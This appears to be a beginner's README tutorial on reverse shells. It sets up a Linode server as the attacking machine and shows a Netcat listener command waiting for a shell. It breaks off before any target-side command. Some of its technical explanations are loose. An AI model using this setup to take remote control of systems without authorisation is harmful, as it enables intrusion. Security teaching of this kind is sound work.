<h2><p align="center">Reverse Shells</h2>

<h3><p align="center">*ONLY FOR EDUCATIONAL PURPOSES ONLY*</h3>

<h4><p align="center">Welcome! This repository is your gateway to understanding reverse shells. If you're new to cybersecurity or curious about remote access methods, you're in the right place. We'll explain reverse shells in simple terms, empowering you to navigate this crucial aspect of digital security with confidence. For this lesson, I will be referring to NetworkChuck's video on how setup a Cloud enviroment for the attacking machine and our target machine. After this lesson, you will understand the importance and reason behind reverse shells. </h4>

[Video](https://www.youtube.com/watch?v=bXCeFPNWjsM&t=267s)
***


<h3>What are Reverse Shells?</h3>

Reverse shells are a type of shell session where a target machine connects back to an attacker's machine, rather than the other way around. This is typically used in scenario's where the target machine is behind a firewall or NAT and cannot accept incoming connections.

Here is a Step-by-Step on how it works
1. The **attacker** compromises the **target** machine and injects code that establishes a connection to a remote system controlled by the **attacker**.
2. Once that connection has established, the **attacker** can now gain access thru the shell on the **target** machine. This allows them to execute commands and interact with the system as if it had physical access to it.
3. This connection is typically encrypted to prevent detection and interception by security measures.

In this lab, we'll also explore the use of Netcat for creating reverse shells. Netcat, a versatile networking tool, acts like a direct line between computers. Think of it as setting up a secret phone call where the target computer calls back to the attacker's system. This enables hackers to gain remote access and control over the target, just like having a direct line to the computer's command center.

***

<h4><p align="center"><u>Tools you'll need</u></h4>

1. A computer for **target** machine
2. Cloud enviroment for **attacking** machine (*I will be using Linode, if you create an account right now and verify, you will get $100 credit to use*)
3. [Virtual Box](https://www.virtualbox.org/wiki/Downloads) (*I will be using KaliLinux*) 
4. Eagerness to learn!

***

<h4><u>Starting with Linode</u></h4>

<i><p align="center">Once you've created your Linode account and received the free $100 credit post-verification, this is how you will set it up.</i>

You will navigate to the top left of the page and look for "Create". Click on the drop down arrow next to it and select "Linode" -> For the distribution, click on "Ubuntu 18.04 LTS" -> Click on the nearest region next to you after that -> click on "Shared CPU" which is under the Linode plan section -> Click on the "Nanode 1GB" option (*Should read with a $5 Monthly charge*) -> After selection, name your Linode and set Root Password -> Then click "Create". 

Once you've setup your Linode, look at the top right underneath the name of the Linode and wait for it to say "Running" with a green circle next to it. This will confirm that your cloud enviroment is now stable and active to run.

<u><h4>Time to Login</h4></u>

*<i><p align="center">Now that we have our Linode setup, its time to login into the enviroment.</i>*

!. Look for your SSH Access and copy it. *(Look at the right side of the top portion of the Linode page and look for Access -> SSH Access)*
2. Open Command Prompt and type in this following command.
```bash
# Command to copy
ssh root@"fill in with your SSH Access"
```
3. Once you've entered the command line and press enter, it will prompt with "Are you sure you want to continue connecting?". Type "yes", then type your Root password. Then VIOLA! you're connected.

*<i><p align="center">Now lets understand NetCat</i>*

1. To go ahead and first check if NetCat is installed, type in the command line "nc"
 ```bash
# Command to copy
nc
```
2. Now going forward, since we are using NetCat to reverse shell, we have to make sure both clients both have NetCat installed. In this matter, since both are Linux machines, they both already come with NetCat installed.
3. Now we are going to use this command to see if it is listening.When picking the port, use a port # that is below 1000. L = Listen, N = IP Address Only, V = Verbose, P = Port
 ```bash
# Command to copy
nc -lvnp "port #" -s "Ip address from Linode"
```
Example: nc -lnvp 87 -s 192.168.1.1

4. Now once you've completed that part, it should prompt with a command line that is listening on that IP.

*<i><p align="center">Now let's set up the **target** machine in KaliLinux</i>*

1. 

